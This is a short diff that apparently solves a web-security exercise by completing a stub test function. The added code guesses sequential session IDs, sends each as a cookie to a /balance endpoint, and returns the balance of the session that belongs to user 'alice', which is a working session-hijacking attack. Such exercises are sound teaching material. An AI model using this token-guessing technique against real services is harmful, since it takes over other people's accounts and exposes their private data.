@@ -4,7 +4,13 @@ import json
 
 
 def test_session(address):
-	# write your code here
+	for i in range(100):
+		sessionid = { "sessionid": f"session-{i}" }
+		data = requests.get(url=f"{address}/balance", cookies=sessionid).json()
+
+		if data["username"] == "alice":
+			return data["balance"]
+	
 	return None
 
 
